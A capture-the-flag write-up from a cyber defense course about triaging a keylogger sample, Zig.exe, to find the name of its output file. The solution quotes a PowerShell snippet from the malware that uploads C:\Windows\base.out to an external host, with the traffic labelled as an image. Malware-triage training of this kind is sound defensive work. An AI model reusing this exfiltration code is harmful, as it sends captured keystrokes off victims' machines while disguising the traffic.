# Keylogger Out #1

## Description

This is for the `Zig.exe` binary!

What was the file name for the first key logger output?

Password to open archive: `infected`

*NOTE* - The resources needed for this challenge are on the `Cyber Defense CTF Triage Workstation` VM on our [hosted platform](https://training.leveleffect.com/courses/f4a9466f-edb0-42ff-bb0e-a95af2b05de5).

WARNING - This challenge involves malware. Do not run this on your personal machine. Use a VM in the Level Effect CTF course or your own. 

## Files

* [zig.zip](files/zig.zip)



## Solution

By reviewing the movezig.ps1 one file, we located what it was doing. 



```powershell

$filePath = "C:\Windows\base.out"
$uri = "http://leveleffectgotallyourbase.com:1337/base.out"
Invoke-RestMethod -Uri $uri -Method Put -InFile $filePath -ContentType "image/jpeg"

```



**Flag: base.out**
